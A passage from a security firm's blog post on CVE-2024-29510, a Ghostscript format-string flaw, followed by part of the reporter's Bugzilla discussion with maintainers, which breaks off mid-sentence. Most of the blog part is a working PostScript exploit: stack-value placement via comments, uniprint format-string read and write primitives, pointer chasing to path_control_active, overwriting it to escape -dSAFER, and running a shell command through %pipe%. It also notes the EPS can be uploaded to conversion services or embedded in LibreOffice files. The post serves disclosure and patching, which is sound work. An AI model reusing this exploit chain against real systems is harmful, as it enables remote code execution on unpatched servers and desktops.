#10  gs_call_interp (pi_ctx_p=0x555558164a50, pref=0x7fffffffd3e0, user_errors=0x1, pexit_code=0x7fffffffd4d8, perror_object=0x7fffffffd4e0) at ./psi/interp.c:531
#11  gs_interpret (pi_ctx_p=0x555558164a50, pref=0x7fffffffd3e0, user_errors=0x1, pexit_code=0x7fffffffd4d8, perror_object=0x7fffffffd4e0) at ./psi/interp.c:488
#12  gs_main_interpret (minst=0x5555581649b0, pref=0x7fffffffd3e0, user_errors=0x1, pexit_code=0x7fffffffd4d8, perror_object=0x7fffffffd4e0) at ./psi/imain.c:257
#13  gs_main_run_string_end (minst=0x5555581649b0, user_errors=0x1, pexit_code=0x7fffffffd4d8, perror_object=0x7fffffffd4e0) at ./psi/imain.c:945
#14  gs_main_run_string_with_length (minst=0x5555581649b0, str=0x555558273390 "<707472732e7073>.runfile", length=0x18, user_errors=0x1, pexit_code=0x7fffffffd4d8, perror_object=0x7fffffffd4e0) at ./psi/imain.c:889
#15  gs_main_run_string (minst=0x5555581649b0, str=0x555558273390 "<707472732e7073>.runfile", user_errors=0x1, pexit_code=0x7fffffffd4d8, perror_object=0x7fffffffd4e0) at ./psi/imain.c:870
#16  run_string (minst=0x5555581649b0, str=0x555558273390 "<707472732e7073>.runfile", options=0x3, user_errors=0x1, pexit_code=0x7fffffffd4d8, perror_object=0x7fffffffd4e0) at ./psi/imainarg.c:1169
#17  runarg (minst=0x5555581649b0, pre=0x555557000263 "", arg=0x7fffffffd658 "ptrs.ps", post=0x555557000914 ".runfile", options=0x3, user_errors=0x1, pexit_code=0x0, perror_object=0x0) at ./psi/imainarg.c:1128
#18  argproc (minst=0x5555581649b0, arg=0x7fffffffd658 "ptrs.ps") at ./psi/imainarg.c:1050
#19  gs_main_init_with_args01 (minst=0x5555581649b0, argc=0x4, argv=0x7fffffffe228) at ./psi/imainarg.c:242
#20  gs_main_init_with_args (minst=0x5555581649b0, argc=0x4, argv=0x7fffffffe228) at ./psi/imainarg.c:289
#21  psapi_init_with_args (ctx=0x555558164180, argc=0x4, argv=0x7fffffffe228) at ./psi/psapi.c:281
#22  gsapi_init_with_args (instance=0x555558164180, argc=0x4, argv=0x7fffffffe228) at ./psi/iapi.c:253
#23  main (argc=0x4, argv=0x7fffffffe228) at ./psi/gs.c:95

```

As you can see, most of the parameter values in this call-stack are pointers, and the few non-pointer values in there are not easily or fully controllable from within Postscript. Sadly, it seems that the same applies for these functions’ local variables: none of them gives us 8 easily controllable sequential bytes.

## A ghostly stack buffer

Luckily, we are not actually limited to the functions of the current call-stack. The stack’s address space is a living region which constantly gets overwritten as the stack grows, shrinks, and grows again. Some function parameters or locals may be uninitialized buffers or padded structs, meaning that they leave previous stack contents in place. Hence, we’re also looking for locals and parameters of functions that *at some point* happened to be in our accessible region of the stack and have not been overwritten since.

One such variable is the `sstate` variable in `gs_scan_token(...)`. This function is invoked as part of the Ghostscript interpreter loop, seemingly when a new token needs to be processed (Postscript is an interpreted language). When this function encounters a percent-sign, it goes into some logic which saves the comment text that follows, just in case it turns out to be a special comment which needs to be processed further.

Special comments are those that start with `%%` or `%!`. These are for example used in EPS file headers to convey metadata:
```

%!PS-Adobe-3.0 EPSF-3.0
%%Document-Fonts: Times-Roman
%%Title: hello.eps
%%Creator: Someone
%%CreationDate: 01-Jan-70
%%Pages: 1
%%BoundingBox:   36   36  576  756
%%LanguageLevel: 1
%%EndComments
%%BeginProlog
%%EndProlog
...

```

Notably, when the comment is the final token in the input stream, the full comment string is `memcpy`‘d into `sstate.s_da.buf`, which is a stack-allocated buffer:

```

      case '%':
      {                   /* Scan as much as possible within the buffer. */
          const byte *base = sptr;
          const byte *end;

          while (++sptr < endptr)         /* stop 1 char early */
              switch (*sptr) {
                  case char_CR:
                      end = sptr;
                      if (sptr[1] == char_EOL)
                          sptr++;
                    cend: /* Check for externally processed comments. */
                      retcode = scan_comment(i_ctx_p, myref, &sstate,
                                             base, end, false);
                      if (retcode != 0)
                          goto comment;
                      goto top;
                  case char_EOL:
                  case '\f':
                      end = sptr;
                      goto cend;
              }
          /*
           * We got to the end of the buffer while inside a comment.
           * If there is a possibility that we must pass the comment
           * to an external procedure, move what we have collected
           * so far into a private buffer now.
           */
          --sptr;
          sstate.s_da.buf[1] = 0;
          {
              /* Could be an externally processable comment. */
              uint len = sptr + 1 - base;
              if (len > sizeof(sstate.s_da.buf))
                  len = sizeof(sstate.s_da.buf);

              memcpy(sstate.s_da.buf, base, len);
              daptr = sstate.s_da.buf + len;
          }
          sstate.s_da.base = sstate.s_da.buf;
          sstate.s_da.is_dynamic = false;
      }

```

It just happens to be the case that this buffer is not overwritten, and we can see it from our format string if `showpage` is called right after a special comment. In order for the comment to be the final token in the interpreter’s buffer, we need to invoke the interpreter recursively. This can be done in various ways, but the simplest way is through Ghostscript’s `.runstring` operator. Think of it like Javascript’s `eval`.

To demonstrate, we take the example from before, but print many more (about 300) 8-byte words from the stack using `%lx` (trimmed):

```

...
/upYMoveCommand (1:%lx\n2:%lx\n3:%lx\n ... 298:%lx\n299:%lx\n300:%lx\n)
...

```

And we insert the following just before `showpage`:

```

(%%XXAAAAAAAA) .runstring

```

Now, the resulting output looks as follows (trimmed):

```

...
222:7ffe2ee85dcc
223:7ffe2ee85dcc
224:7ffe2ee85dcc
225:5858252500000000
226:4141414141414141
227:0
228:0
229:0
230:7ffe2ee85e30
231:62bea58b57b0
...

```

It seems that `sstate.s_da.buf` roughly spans stack indices 225 – 229. The structure’s offsets are such that the start of our comment (`"%%XX"`) is stored in the word at 225, whereas the word at 226 is the first one we have full control over (`"AAAAAAAA"`). Hence, we can generalize our code a bit to build a simple primitive that puts an 8-byte string as a single word on the stack (the real stack, not the Postscript stack!):

```

/StackString (AAAAAAAA) def % this can be determined at runtime
(%%XX) StackString cat .runstring

```
## Putting things together

Now we can put an arbitrary 8-byte value at a known location on the stack, meaning that we can finally properly use `%s` and `%n` to their full potential, giving us memory read and write primitives!

Let’s abstract away the `uniprint` format-string invocations and file read into a Postscript procedure called `do_uniprint`:

```

% <StackString> <FmtString> do_uniprint <LeakedData>
/do_uniprint {
	/FmtString exch def   % the format string payload to use
	/StackString exch def % which 8-byte string to put on the stack beforehand

	% Select uniprint device with our payload
	<<
		/OutputFile PathTempFile
		/OutputDevice /uniprint
		/upColorModel /DeviceCMYKgenerate
		/upRendering /FSCMYK32
		/upOutputFormat /Pcl
		/upOutputWidth 99999 % This gives a bigger buffer for our format string
		/upWriteComponentCommands {(x)(x)(x)(x)} % This is required, just put bogus strings
		/upYMoveCommand FmtString
	>>
	setpagedevice

	% Manipulate the interpreter to put controlled data on the stack
	(%%XX) StackString cat .runstring

	% Produce a page with some content to trigger format string logic
	newpath 1 1 moveto 1 2 lineto 1 setlinewidth stroke
	showpage

	% Read back the written data
	/InFile PathTempFile (r) file def
	/LeakedData InFile 4096 string readstring pop def
	InFile closefile

	LeakedData % return
} bind def

```

This then allows us to write the higher level procedures `write_to`, `read_ptr_at`, `read_dereferenced_bytes_at`, `read_dereferenced_ptr_at`:

```

% <StackIdx> <AddrHex> write_to
/write_to {
	/AddrHex exch str_ptr_to_le_bytes def % address to write to
	/StackIdx exch def % stack idx to use

	/FmtString StackIdx 1 sub (%x) times (_%ln) cat def

	AddrHex FmtString do_uniprint

	pop % we don't care about formatted data
} bind def

% <StackIdx> read_ptr_at <PtrHexStr>
/read_ptr_at {
	/StackIdx exch def % stack idx to use

	/FmtString StackIdx 1 sub (%x) times (__%lx__) cat def

	() FmtString do_uniprint

	(__) search pop pop pop (__) search pop exch pop exch pop
} bind def

% num_bytes <= 9
% <StackIdx> <PtrHex> <NumBytes> read_dereferenced_bytes_at <ResultAsMultipliedInt>
/read_dereferenced_bytes_at {
	/NumBytes exch def
	/PtrHex exch def
	/PtrOct PtrHex str_ptr_to_le_bytes def % address to read from
	/StackIdx exch def % stack idx to use

	/FmtString StackIdx 1 sub (%x) times (__%.) NumBytes 1 string cvs cat (s__) cat cat def

	PtrOct FmtString do_uniprint

	/Data exch (__) search pop pop pop (__) search pop exch pop exch pop def

	% Check if we were able to read all bytes
	Data length NumBytes eq {
		% Yes we did! So return the integer conversion of the bytes
		0 % accumulator
		NumBytes 1 sub -1 0 {
			exch % <i> <accum>
			256 mul exch % <accum*256> <i>
			Data exch get % <accum*256> <Data[i]>
			add % <accum*256 + Data[i]>
		} for
	} {
		% We did not read all bytes, add a null byte and recurse on addr+1
		StackIdx 1 PtrHex ptr_add_offset NumBytes 1 sub read_dereferenced_bytes_at
		256 mul
	} ifelse
} bind def

% <StackIdx> <AddrHex> read_dereferenced_ptr_at <PtrHexStr>
/read_dereferenced_ptr_at {
	% Read 6 bytes
	6 read_dereferenced_bytes_at

	% Convert to hex string and return
	16 12 string cvrs
} bind def

```
## Exploitation

Our final exploitation goal is to escape the `-dSAFER` sandbox, as this would give us full RCE on the machine running Ghostscript. When `-dSAFER` is enabled, Ghostscript permanently sets a boolean field (`path_control_active`) in a global context structure to 1. From within Postscript it is normally not possible to change this value back after it’s been set to 1.

However, if we can literally poke into memory at the right location and set this field to 0, all `-dSAFER` limitations would be gone instantly, for as long as the Ghostscript process runs.

So, we’d need to find the address of `path_control_active` (due to ASLR, this changes every time). This field is part of the `gs_lib_ctx_core_t` structure, a global instance of which is allocated on the heap, but we don’t know where exactly because it’s not referred to anywhere on the stack.

Instead, we can use the fact that a pointer to the `gs_lib_ctx_core_t` structure is part of `gs_lib_ctx_t`, which is part of `gs_memory_t`. And as it happens, the function containing the `gs_snprintf` invocation, `upd_wrtrtl(upd_p upd, gp_file *out)`, receives a `gp_file *` parameter `out` which has a pointer to `gs_memory_t`. In other words, we just need to grab `out` from its consistent stack location and then dereference it a bunch of times to get `&out->memory->gs_lib_ctx->core->path_control_active`.

[![](https://codeanlabs.com/wp-content/uploads/2024/04/mem_layout_trans.drawio.png)](https://codeanlabs.com/wp-content/uploads/2024/04/mem_layout.drawio.png)

Because none of these fields are at offset 0 in their parent structs, we need to be able to add an offset to a leaked (hex) pointer value, before dereferencing it again. Luckily Postscript is quite flexible in terms of dealing with base-16 numbers, so the following does the trick:

```

% <Offset> <PtrHexStr> ptr_add_offset <PtrHexStr>
/ptr_add_offset {
	/PtrHexStr exch def % hex string pointer
	/Offset exch def % integer to add

	/PtrNum (16#) PtrHexStr cat cvi def

	% base 16, string length 12
	PtrNum Offset add 16 12 string cvrs
} bind def

```

The result is a hex string, but to get this value onto the stack (remember, using the `%%BB........` comment) it needs to be a string of raw bytes, and reversed (on little-endian systems at least). Hence, we write another helper function:

```

% Convert hex string "4142DEADBEEF" to padded little-endian byte string "\xEF\xBE\xAD\xDE\x42\x41\x00\x00"
% <HexStr> str_ptr_to_le_bytes <ByteStringLE>
/str_ptr_to_le_bytes {
	% Convert hex string argument to Postscript string
	% using <DEADBEEF> notation
	/ArgBytes exch (<) exch (>) cat cat token pop exch pop def

	% Prepare resulting string (`string` fills with zeros)
	/Res 8 string def

	% For every byte in the input
	0 1 ArgBytes length 1 sub {
		/i exch def

		% put byte at index (len(ArgBytes) - 1 - i)
		Res ArgBytes length 1 sub i sub ArgBytes i get put
	} for

	Res % return
} bind def

```

Don’t worry if this is confusing, it’s just piping to automate the exploit. With all these primitives in place, we can obtain the address of Ghostscript’s `path_control_active` using a chain of `read_dereferenced_ptr_at` and `ptr_add_offset`:

```

% Use primitives to obtain: &out->memory->gs_lib_ctx->core->path_control_active

/IdxOutPtr 5 def  % Position of `gp_file *out` on the stack
/PtrOut IdxOutPtr read_ptr_at def

% `memory` is at offset 144 in `out`
/PtrOutOffset 144 PtrOut ptr_add_offset def
/PtrMem IdxStackControllable PtrOutOffset read_dereferenced_ptr_at def

% `gs_lib_ctx` is at offset 208 in `memory`
/PtrMemOffset 208 PtrMem ptr_add_offset def
/PtrGsLibCtx IdxStackControllable PtrMemOffset read_dereferenced_ptr_at def

% `core` is at offset 8 in `gs_lib_ctx`
/PtrGsLibCtxOffset 8 PtrGsLibCtx ptr_add_offset def
/PtrCore IdxStackControllable PtrGsLibCtxOffset read_dereferenced_ptr_at def

% `path_control_active` is at offset 156 in `core`
/PtrPathControlActive 156 PtrCore ptr_add_offset def

```

Now we have the address of `path_control_active`. The only remaining step is to overwrite it with 0. Using variants of `%n` it is not possible to write such a low value directly, but we can easily overcome that by instead writing to `&path_control_active - 3` instead, which on little-endian platforms will overwrite the least-significant byte of the actual field with the most-significant byte of whichever (small) integer we’re writing, hence setting it to zero. We do partially corrupt another value in the struct but it does not seem important. Immediately afterwards the sandbox will be disabled, allowing for the execution of shell commands through `%pipe%`:

```

% Subtract a bit from the address to make sure we write a null over the field
/PtrTarget -3 PtrPathControlActive ptr_add_offset def

% And overwrite it!
IdxStackControllable PtrTarget write_to

% And now path_control_active == 0, so we can use %pipe% as if -dSAFER was never set :)

(%pipe%gnome-calculator) (r) file

```

Download the full exploit for Linux (x86-64) [here](https://codeanlabs.com/wp-content/uploads/2024/06/CVE-2024-29510_poc_calc.eps). Of course you can change the command at the end (`gnome-calculator`) to your liking.

The exploit code is also a valid EPS file, hence it can be uploaded to image conversion services that accept EPS and invoke Ghostscript. Alternatively we can embed it in a LibreOffice document file, triggering the command execution when the file is opened, either on a server via the headless `libreoffice-convert`, or on a desktop:

## Mitigation

At Codean Labs we realize it is difficult to keep track of dependencies like this and their associated risks. It is our pleasure to take this burden from you. We perform application security assessments in an efficient, thorough and human manner, allowing you to focus on development. [Click here](https://codeanlabs.com/pentest/) to learn more.

The best mitigation against this vulnerability is to update your installation of Ghostscript to v10.03.1. If your distribution does not provide the latest Ghostscript version, it might still have released a patch version containing a fix for this vulnerability (e.g., [Debian](https://packages.debian.org/search?keywords=ghostscript), [Ubuntu](https://ubuntu.com/security/notices/USN-6835-1), [Fedora](https://koji.fedoraproject.org/koji/buildinfo?buildID=2480001)). It might also be the case that your distribution provides a version so old (< v9.50) that it is not vulnerable to this CVE either.

If you’re unsure if you’re affected, we provide a testkit: a small Postscript file which will tell you if your version of Ghostscript is affected. Download it [here](https://codeanlabs.com/wp-content/uploads/2024/07/CVE-2024-29510_testkit.ps), and run it like this:

```

ghostscript -q -dNODISPLAY -dBATCH -dSAFER CVE-2024-29510_testkit.ps

```

## Timeline

* 2024-03-14: reported to the Artifex Ghostscript issue tracker
* 2024-03-24: CVE-2024-29510 assigned by Mitre
* 2024-03-28: issue acknowledged by the developers
* 2024-05-02: Ghostscript 10.03.1 released which mitigates the issue
* 2024-07-02: publication of this blogpost

# We are here for you

[Schedule a meeting](https://calendar.google.com/calendar/appointments/schedules/AcZssZ30zahGVLL7gAWd_jNKsOMudLtoZYwzyVQChrc8StEfD-FbT15fNylYv4ybJN3xT_raaEL_n7uE?gv=true)
[Contact us](/cdn-cgi/l/email-protection#c5ada0a9a9aa85a6aaa1a0a4aba9a4a7b6eba6aaa8)

#### Services

* [Pricing](https://codeanlabs.com/pricing/)
* [∞ code analysis](https://codeanlabs.com/services-code-analysis/)
* [◦ codeless analysis](https://codeanlabs.com/services-codeless-analysis/)
* [CTF](https://codeanlabs.com/services-ctf/)

#### Support

* [Help](/cdn-cgi/l/email-protection#186b6d6868776a6c587b777c7d797674797a6b367b7775)
* [Status](http://status.codean.cloud)

#### Company

* [Home](https://codeanlabs.com/)
* [About](https://codeanlabs.com/about/)
* [Jobs](https://codeanlabs.com/jobs/)

* [Privacy statement](https://codeanlabs.com/wp-content/uploads/2023/12/Privacy-statement.pdf)

* CoC 82936080
* VAT NL862661365B01

* [[email protected]](/cdn-cgi/l/email-protection#b9d1dcd5d5d6f9dad6dddcd8d7d5d8dbca97dad6d4)
* +31 (0)30 899 3984

* Parijsboulevard 209
* 3541 CS Utrecht
* The Netherlands

### Codean uses cookies

We use cookies to enhance your browsing experience and analyze site traffic.
By continuing to use this website, you consent to our privacy statement

Accept
Decline



=== Content from bugs.ghostscript.com_dc643a2e_20250110_172539.html ===


Bugzilla – Bug 707662
Format string injection leads to shell command execution (SAFER bypass)
Last modified: 2024-05-24 13:24:30 UTC

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=707662&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=707662&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 707662**](show_bug.cgi?id=707662)
- Format string injection leads to shell command execution (SAFER bypass)

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
Format string injection leads to shell command execution (SAFER bypass)

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Ghostscript | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Ghostscript "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Security (public) ([show other bugs](buglist.cgi?component=Security%20(public)&product=Ghostscript&bug_status=__open__)) | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | PC Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | P2 normal | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Chris Liddell (chrisl) | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2024-03-14 16:19 UTC by Thomas Rinsma | | --- | --- | | Modified: | 2024-05-24 13:24 UTC ([History](show_activity.cgi?id=707662)) | | CC List: | 11 users (show)  akhaitov carnil cbuissar dr jsmeix ken.sharp marc.deslauriers rlescak robin.watts sam till.kamppeter | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Customer:](page.cgi?id=fields.html#cf_customer "A custom Free Text field in this installation of Bugzilla.") |  | | [Word Size:](page.cgi?id=fields.html#cf_wordsize "For example x86 would be 32 and x86_64 would be 64.") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=707662&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=707662&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=707662#c0)  Thomas Rinsma    2024-03-14 16:19:44 UTC  ``` Created [attachment 25468](attachment.cgi?id=25468) [[details]](attachment.cgi?id=25468&action=edit) Proof-of-concept for Linux  Hi. I ran into another vulnerability and I’m afraid it has a higher impact than the previous ones. This one affects at least 10.01.2 and higher, but likely older versions as well.  The `uniprint` device allows the user to provide various string fragments as device options, which are later appended to the output file. Two of these parameters, `upWriteComponentCommands` and `upYMoveCommand`, are actually treated as format strings, specifically for `gp_fprintf` and `gs_snprintf`. For these, the intention is for the user to include just one format specifier in the string, but there is no logic preventing arbitrary format strings (with multiple specifiers) from being used.  Relevant code:  <https://github.com/ArtifexSoftware/ghostpdl/blob/master/devices/gdevupd.c#L7019-L7040> <https://github.com/ArtifexSoftware/ghostpdl/blob/master/devices/gdevupd.c#L7044-L7056>  With full control over the format string (by setting a page device with the respective options), and read access to the device output (by setting it to a temporary file path), an attacker can abuse this to leak data from the stack and perform memory corruption. This is specifically impactful in the cases of `gs_snprintf` (as opposed to `gp_fprintf`), as its format-string parsing logic is not hardened by compiler measures like `D_FORTIFY_SOURCE`, while it still supports the `%n` modifier.  Concretely, if an attacker manages to arbitrarily control a single pointer-sized word on the stack[*], this vulnerability gives:  - An arbitrary memory _read_ primitive by using `%s` after (n-1) padding specifiers, where n is the stack-index containing the attacker-controlled word. - A semi-arbitrary _write_ primitive by using `%n` in that location instead. This writes out the length of the generated string at that point, which can be as high as at least 0xFFFF, hence giving an arbitrary uint16-write with `%hn` .  The function containing the vulnerable invocations (`upd_wrtrtl`) gets `gp_file *out` as one of its arguments, hence this is high up on the stack (index 5). Using the read and write primitives we can thus find the address of `out->memory->gs_lib_ctx->core->path_control_active`, and overwrite it with 0 (by writing an int to an address just below it).  Attached is a proof-of-concept which I tested to work on Ubuntu mantic’s 10.01.2, Arch Linux’s 10.03.0 and current Git HEAD (also on x64 Ubuntu). It tries to figure out as much as possible from the stack, but there are still things like hardcoded struct offsets which would probably have to be tweaked for different architectures/OSes and possibly older Ghostscript versions. Run with `-dSAFER -dBATCH -dNODISPLAY` and change the pipe command if needed.  ---  [*] Interesting but not relevant to the bug: for my proof-of-concept, I randomly found and reduced a specific snippet (involving `eexec`) which will cause `interp()` to put at least 8 characters from an interpreted string in its “dynamic area”, which happens to reliably still be somewhere on the stack (around index 220) during the `gs_snprintf` invocations. This is just what I came across though: there are likely various ways to put an arbitrary number somewhere on the stack. ```  [Comment 1](show_bug.cgi?id=707662#c1)  Thomas Rinsma    2024-03-14 16:23:03 UTC  ``` Created [attachment 25469](attachment.cgi?id=25469) [[details]](attachment.cgi?id=25469&action=edit) Videos showing the proof-of-concept exploit  Added two videos of the PoC running on my Ubuntu machine, also showing it impacting desktop usage in case of a LibreOffice file with embedded .eps (for fun but also maybe good to know). ```  [Comment 2](show_bug.cgi?id=707662#c2)  Thomas Rinsma    2024-03-14 16:29:15 UTC  ``` Created [attachment 25470](attachment.cgi?id=25470) [[details]](attachment.cgi?id=25470&action=edit) Minimal test case for just the vulnerability  This is a minimal file showing just the vulnerability.  Run with `ghostscript -dSAFER -dNODISPLAY -dBATCH minipoc.ps`. Then `cat /tmp/uniprint` to see the leaked stack contents.  Change the file path to an accessible location where needed. ```  [Comment 3](show_bug.cgi?id=707662#c3)  Ken Sharp    2024-03-14 16:29:38 UTC  ``` (In reply to Thomas Rinsma from [comment #1](show_bug.cgi?id=707662#c1)) > Created [attachment 25469](attachment.cgi?id=25469) [[details]](attachment.cgi?id=25469&action=edit) > Videos showing the proof-of-concept exploit >  > Added two videos of the PoC running on my Ubuntu machine, also showing it > impacting desktop usage in case of a LibreOffice file with embedded .eps > (for fun but also maybe good to know).  Please don't attach videos to bug reports, they really don't add anything to the report and it's essentially impossible to delete attachments from Bugzilla, we have to go and replace them with empty files instead.  We don't need you to prove something on your machine, we're quite prepared to believe you on that, but we need to see it on a machine we can use in order to debug the problem properly.  I appreciate this is a small file, but we'd still rather not receive video files at all. ```  [Comment 4](show_bug.cgi?id=707662#c4)  Thomas Rinsma    2024-03-15 08:21:06 UTC  ``` (In reply to Ken Sharp from [comment #3](show_bug.cgi?id=707662#c3)) > Please don't attach videos to bug reports, they really don't add anything to > the report and it's essentially impossible to delete attachments from > Bugzilla, we have to go and replace them with empty files instead. >  > We don't need you to prove something on your machine, we're quite prepared > to believe you on that, but we need to see it on a machine we can use in > order to debug the problem properly.  My apologies! Is the attached minimal test case enough for you to reproduce the vulnerability? ```  [Comment 5](show_bug.cgi?id=707662#c5)  Thomas Rinsma    2024-03-15 12:01:33 UTC  ``` For your information, I have requested a CVE for this vulnerability. ```  [Comment 6](show_bug.cgi?id=707662#c6)  Thomas Rinsma    2024-03-24 13:15:17 UTC  ``` CVE-2024-29510 was assigned to this issue. ```  [Comment 7](show_bug.cgi?id=707662#c7)  Thomas Rinsma    2024-03-28 14:43:41 UTC  ``` Just checking, were you able to reproduce the bug, or is any additional information required?  I'd like to stress the severity of the bug. This seems to affect various under-the-hood usages of Ghostscript, like via ImageMagick and LibreOffice, and hence various server-side and desktop use-cases.  As for a potential solution; I realize that these parameters being format strings is somewhat of a feature of uniprint so the string formatting cannot be skipped entirely. Hence it might be simplest to pre-process these two format strings (S_YMOVE and SA_WRITECOMP) in upd_put_params, making sure that they contain the expected number of format-string specifiers (currently seemingly exactly one per string). ```  [Comment 8](show_bug.cgi?id=707662#c8)  Ken Sharp    2024-03-28 14:55:43 UTC  ``` (In reply to Thomas Rinsma from [comment #7](show_bug.cgi?id=707662#c7)) > Just checking, were you able to reproduce the bug, or is any additional > information required?  Yes I can reproduce it. I'm currently completely snowed under due to customer bug reports, security reports and the fact that we are short resourced, partly due to vacations.   > As for a potential solution; I realize that these parameters being format > strings is somewhat of a feature of uniprint so the string formatting cannot > be skipped entirely. Hence it might be simplest to pre-process these two > format strings (S_YMOVE and SA_WRITECOMP) in upd_put_params, making sure > that they contain the expected number of format-string specifiers (currently > seemingly exactly one per string).  I suspect the answer, in the short term, will be to prevent PostScript code altering these parameters after SAFER is true, which means they will only be able to be set from the command line.  Since the format strings can legitimately contain anything, it's quite hard to ensure that they contain one and only one parameter, and that the parameter is of a suitable type. ```  [Comment 9](show_bug.cgi?id=707662#c9)  Thomas Rinsma    2024-03-28 15:06:09 UTC  ``` (In reply to Ken Sharp from [comment #8](show_bug.cgi?id=707662#c8)) > Yes I can reproduce it. I'm currently completely snowed under due to > customer bug reports, security reports and the fact that we are short > resourced, partly due to vacations.  Clear, and apologies for pushing on this in that case. I would offer to help with mitigation but I am not familiar enough with the codebase and the various usecases to be helpful there. Anyway, let me know when I can help by e.g. double checking a potential fix or anything.  > > As for a potential solution; I realize that these parameters being format > > strings is somewhat of a feature of uniprint so the string formatting cannot > > be skipped entirely. Hence it might be simplest to pre-process these two > > format strings (S_YMOVE and SA_WRITECOMP) in upd_put_params, making sure > > that they contain the expected number of format-string specifiers (currently > > seemingly exactly one per string). >  > I suspect the answer, in the short term, will be to prevent PostScript code > altering these parameters after SAFER is true, which means they will only be > able to be set from the command line. >  > Since the format strings can legitimately contain anything, it's quite hard > to ensure that they contain one and only one parameter, and that the > parameter is of a suitable type.  I was not sure if this was an intended usecase, but if that's safe to do then indeed that's way better. If `setpagedevice` can be disabled entirely in case of SAFER that would reduce a ton of attack surface (for most conversion usecases). ```  [Comment 10](show_bug.cgi?id=707662#c10)  Ken Sharp    2024-03-28 15:28:55 UTC  ``` (In reply to Thomas Rinsma from [comment #9](show_bug.cgi?id=707662#c9))  > > Since the format strings can legitimately contain anything, it's quite hard > > to ensure that they contain one and only one parameter, and that the > > parameter is of a suitable type. >  > I was not sure if this was an intended usecase, but if that's safe to do > then indeed that's way better.  I wasn't certain this was going to be possible, but I've looked at some of the uniprint configuration files and convinced myself that it is possible to fully configure the uniprint device from the command line.  I can conceive of cases where the user might want to permit the PostScript program to change device and configuration, in that case they will just have to use NOSAFER. At least by requiring a specific action we can make it clear that this is a potentially risky operation.  I'd expect these cases to be in a controlled environment anyway. That is, I'd expect the PostScript program to be also under the control of the user, not acquired from a source of unknown provenance.   > If `setpagedevice` can be disabled entirely > in case of SAFER that would reduce a ton of attack surface (for most > conversion usecases).  We can't disable setpagedevice because it's the specified way to change all kinds of benign settings, in particular the media size but basically any device parameter. Almost all non-trivial, real world, PostScript programs involve executing setpagedevice. Sometimes many times.  We also rely on the internal mechanics for reconfiguring devices with interpreters other than PostScript which don't, obviously, use setpagedevice.  We have had some discussion internally, and will have more next week, about preventing users from switching device once SAFER is active. Apart from limiting the attack surface it occurred to me that there are many cases where the 'user' would want to prevent the PostScript program from switching devices. I'm thinking of SaaS provision in particular but anyone with a workflow involving Ghostscript might reasonably wish to prevent the device being changed by the input program.  Unfortunately we are also aware of cases where Ghostscript is being used in a workflow which requires the ability to change device.  I have a proposed solution for this, up for discussion. It's the kind of change which we'll have to give notice for before implementation, so if we do go down that route it will be flagged up in a patch release 'sometime soon' (to be clear, there definitely *will* be a patch release sometime soon, which may contain this warning) and then rolled into the next main release. ```  [Comment 11](show_bug.cgi?id=707662#c11)  Thomas Rinsma    2024-03-28 15:53:54 UTC  ``` (In reply to Ken Sharp from [comment #10](show_bug.cgi?id=707662#c10)) > We can't disable setpagedevice because it's the specified way to change all > kinds of benign settings, in particular the media size but basically any > device parameter. Almost all non-trivial, real world, PostScript programs > involve executing setpagedevice. Sometimes many times. Good to know, I didn't consider that. I indeed specifically mean changing the output device.  > We have had some discussion internally, and will have more next week, about > preventing users from switching device once SAFER is active. Apart from > limiting the attack surface it occurred to me that there are many cases > where the 'user' would want to prevent the PostScript program from switching > devices. I'm thinking of SaaS provision in particular but anyone with a > workflow involving Ghostscript might reasonably wish to prevent the device > being changed by the input program. This is my intuition as well. These conversion processes just expect e.g. a PNG or a PDF as output, usually on stdout, and nothing else. I don't think many of such users even realize what all could be happening to be honest, like in this case writing output to files under /tmp/ and reading it back. I would almost suggest a "SAFEST" mode with only 